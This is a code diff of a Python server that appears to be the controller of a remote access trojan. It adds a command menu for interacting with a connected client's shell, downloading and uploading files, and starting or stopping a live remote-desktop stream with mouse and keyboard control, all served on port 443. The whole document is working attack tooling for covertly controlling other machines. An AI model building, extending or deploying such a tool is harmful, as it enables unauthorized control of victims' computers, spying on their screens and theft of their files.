@@ -1,13 +1,12 @@
 import cv2
-import numpy as np
 import socket
 import pickle
 import struct
 import threading
 import lzma
-import time
 import os
 import json
+
 global _win32
 try:
     import win32api
@@ -15,10 +14,15 @@ try:
 except:
     _win32 = False
 
-
-SWIDTH = 960
-SHEIGHT = 540
-
+menu = """
+Commands            Description
+~~~~~~~~            ~~~~~~~~~~~
+!shell              Interact with the clients shell
+!download           Download a file from client
+!upload             Upload a file to client
+!start_stream       Start a remote desktop connection
+!stop_stream        Stop the remote desktop connection
+"""
 
 class RemoteDesktop:
     def __init__(self, host, port):
@@ -36,11 +40,15 @@ class RemoteDesktop:
         self.height = 0
         self.cwd = "> "
         self.display_data = {}
-        self.position = 0    
+        self.position = 0   
+        self.connected_ip = []
+        self.connected_port = []
+        self.stream = False
+        self.killstream = False
 
     def start_server(self):
         if self.active:
-            print("[-] server already running")
+            print("server already running")
         else:
             self.active = True
             server_thread = threading.Thread(target=self.__server_listening)
@@ -52,10 +60,12 @@ class RemoteDesktop:
         while self.active:
             self.__block.acquire()
             connection, address = self.socket.accept()
+            self.connected_ip.append(address[0])
+            self.connected_port.append(address[1])
             self.__block.release()
             t = threading.Thread(target=self.__client_connection, args=(connection, address,))
             t.start()
-            print("[+] Connection started!")
+            print("Connection started!")
     
     def stop_server(self):
         if self.active:
@@ -67,13 +77,17 @@ class RemoteDesktop:
             self.socket.close()
             self.__block.release()
         else:
-            print("[!] Server not running!")
+            print("Server not running!")
             
             
-            
+
+
+    # def send(self, msg, conn):
+    #     conn.send(msg)
+
     def send(self, msg, conn):
-        conn.send(msg)
-        
+        conn.sendall(struct.pack('>I', len(msg)) + msg)
+
         
     def is_between(self, num, range1, range2):
         if range1 > range2:
@@ -98,7 +112,6 @@ class RemoteDesktop:
                 win32api.SetCursor(win32api.LoadCursor(0, 32649))
             x = str(x + self.get_pos())
             y = str(y + int(self.display_data[self.monitor - 1]['position'][1]))
-            #print(x + self.get_pos() + int(self.display_data[self.monitor - 1]['position'][0]))
             event = str(event)
             flags = str(flags)
             data = ["mouse", x, y, event, flags]
@@ -123,14 +136,66 @@ class RemoteDesktop:
             return (fps, (2, 186, 252))
         else:
             return (fps, (0, 255, 0))
+        
+
+    def download(self, data):
+        with open(f"downloads/{self.filename}", 'wb') as _file:
+            _file.write(data[10:])
+            self.revshell = True
+            print("DOWNLAD COMPLETE")
+
+            
+    def received(self, data, connection):
+        if data.startswith(b"download->"):
+            print("DONWLOADING")
+            self.download(data)
+        elif data.startswith(b"upload->"):
+            print("UPLOADING")
+            self.upload(data, connection)
+        else:
+            self.cwd = data.decode().split(">", 1)[0] + "> "
+            print(data.decode().split(">", 1)[1])
+            self.revshell = True
 
         
+    def menu(self, connection, address):
+        while self.revshell:
+            try:
+                shell = input(str(address[0]) + "> ")
+                if shell == "cls" or shell == "clear":
+                    os.system("cls")
+                elif shell == "":
+                    continue
+                elif shell.startswith("!download"):
+                    self.filename = shell.split(" ")[1]
+                    self.send(b"shell:"+shell.encode('utf-8'), connection)
+                elif shell.startswith("!upload"):
+                    with open(shell.split(" ")[1], "rb") as _file:
+                        self.send(b"shell:" + shell.encode('utf-8')+ b" " + _file.read(), connection)
+                elif shell == "!start_stream":
+                    self.send(b"shell:"+shell.encode('utf-8'), connection)
+                    self.stream = True
+                elif shell == "!stop_stream":
+                    self.send(b"shell:"+shell.encode('utf-8'), connection)
+                    self.stream = False
+                    self.killstream = True
+                elif shell == "!shell":
+                    self.shell(connection)
+                elif shell == "help":
+                    print(menu)
+                else:
+                    print("Invalid command. Type help to view options")
+            except EOFError:
+                print()
+            continue
 
     def shell(self, connection):
         while True:
             if self.revshell:
                 try:
                     shell = input(self.cwd)
+                    if shell == "exit":
+                        break
                     if shell == "cls" or shell == "clear":
                         os.system("cls")
                     elif shell == "":
@@ -142,69 +207,84 @@ class RemoteDesktop:
                 except EOFError:
                     print()
                     continue
-            else:
-                pass
-    '''Sorry for the messy function'''
-    def __client_connection(self, connection, address):
-        shell_thread = threading.Thread(target=self.shell, args=(connection,))
-        shell_thread.start()
-        try:
-            display = connection.recv(1028).decode()
-            self.display_data = json.loads(display)
-            self.width, self.height = int(self.display_data[0]['size'][0]), int(self.display_data[0]['size'][1])
-            self.monitor = int(self.display_data[0]['len_monitors'])
-        except:
-            pass
-        payload_size = struct.calcsize('>L')
-        data = b""
-        loop_time = time.time()
-        send = 0
-        cv2.namedWindow(str(address), cv2.WINDOW_KEEPRATIO)
-        cv2.resizeWindow(str(address), (SWIDTH, SHEIGHT))
-        cv2.createTrackbar("Quality", str(address), 15, 100, lambda x: x)
-        cv2.createTrackbar("Monitor", str(address), 0, self.monitor, lambda y: y)
-        while self.active:
-            break_loop = False
-            while len(data) < payload_size:
-                received = connection.recv(4096)
-                if received == b'':
-                    connection.close()
-                    break_loop = True
-                    break
-                data += received
-            if break_loop:
-                break
-            packed_msg_size = data[:payload_size]
-            data = data[payload_size:]
-            msg_size = struct.unpack(">L", packed_msg_size)[0]
-            while len(data) < msg_size:
-                data += connection.recv(4096)
-            frame_data = data[:msg_size]
-            data = data[msg_size:]
-            if frame_data[0:7].decode() == "video->":
-                frame = self.sortframe(frame_data[7:])
-                cv2.rectangle(frame, (self.width-30, 0), (self.width-80, 50), (136, 8, 8), 4)
-                if self.userinput == 0:
-                    cv2.putText(frame, "Click blue box to control", (200,40), cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0,0), 2)
-                cv2.setMouseCallback(str(address), self.showcords, param=(connection))
-                cv2.imshow(str(address), frame)
-                k = cv2.waitKey(1)
-                quality = cv2.getTrackbarPos("Quality", str(address))
-                self.monitor = cv2.getTrackbarPos("Monitor", str(address)) + 1
-                quality = "config:" + str(quality) + ":" + str(self.userinput) + ":" + str(self.monitor)
-                if k != -1 and self.userinput == 1:
-                    keyboard = "keyboard:" + str(k)
-                    self.send(keyboard.encode('utf-8'), connection)
-                if send >= 5:
-                    self.send(str(quality).encode('utf-8'), connection)
-                    send = 0
-            else:
-                self.cwd = frame_data.decode().strip().split(">", 1)[0] + "> "
-                print(frame_data.decode().split(">", 1)[1])
-                self.revshell = True
-            send +=1
 
+            
+
+    def Getclientdetails(self, connection, address):
+        shell_thread = threading.Thread(target=self.menu, args=(connection, address,))
+        shell_thread.start()
+        display = connection.recv(1028).decode()
+        self.display_data = json.loads(display)
+        self.width, self.height = int(self.display_data[0]['size'][0]), int(self.display_data[0]['size'][1])
+        self.monitor = int(self.display_data[0]['len_monitors'])
+        return self.monitor
+    
+
+    def recvall(self, max_buff, connection):
+        # Helper function to recv n bytes or return None if EOF is hit
+        data = bytearray()
+        while len(data) < max_buff:
+            packet = connection.recv(max_buff - len(data))
+            if not packet:
+                return None
+            data.extend(packet)
+        return data
+    
+    def recv(self, connection):
+        # Read message length and unpack it into an integer
+        raw_msglen = self.recvall(4, connection)
+        if not raw_msglen:
+            return None
+        msglen = struct.unpack('>I', raw_msglen)[0]
+        # Read the message data
+        return self.recvall(msglen, connection)
+    
+    '''Sorry for the messy function'''
+
+    def window(self, name):
+        cv2.namedWindow(name, cv2.WINDOW_KEEPRATIO)
+        cv2.resizeWindow(name, (960, 540))
+        cv2.createTrackbar("Quality", name, 15, 100, lambda x: x)
+        cv2.createTrackbar("Monitor", name, 0, self.monitor, lambda y: y)
+
+    def display_frame(self, data_stream, connection, address):
+        frame = self.sortframe(data_stream[7:])
+        cv2.rectangle(frame, (self.width-30, 0), (self.width-80, 50), (136, 8, 8), 4)
+        if self.userinput == 0:
+            cv2.putText(frame, "Click blue box to control", (200,40), cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0,0), 2)
+        cv2.setMouseCallback(str(address), self.showcords, param=(connection))
+        cv2.imshow(str(address), frame)
+    def __client_connection(self, connection, address):
+        self.monitor = self.Getclientdetails(connection, address)
+        send = 0
+        while self.active:
+            data_stream = self.recv(connection)
+            if self.stream:
+                self.window(str(address))
+                self.stream = False
+            elif not self.stream and self.killstream:
+                try:
+                    cv2.destroyAllWindows()
+                    self.killstream = False
+                except: 
+                    pass
+            try:
+                if data_stream[0:7].decode() == "video->":
+                    self.display_frame(data_stream, connection, address)
+                    k = cv2.waitKey(1)
+                    self.monitor = cv2.getTrackbarPos("Monitor", str(address)) + 1
+                    quality = "config:" + str(cv2.getTrackbarPos("Quality", str(address))) + ":" + str(self.userinput) + ":" + str(self.monitor)
+                    if k != -1 and self.userinput == 1:
+                        keyboard = "keyboard:" + str(k)
+                        self.send(keyboard.encode('utf-8'), connection)
+                    if send >= 5:
+                        self.send(str(quality).encode('utf-8'), connection)
+                        send = 0
+                else:
+                    self.received(data_stream, connection)
+                send +=1
+            except cv2.error:
+                self.active = False
+                pass
 if __name__ == '__main__':
-    server = RemoteDesktop('0.0.0.0', 443)
-    server.start_server()
-    print("[+] Server Started\n[*] Listening For Incomming Connections...\n")
+    RemoteDesktop('0.0.0.0', 443).start_server()
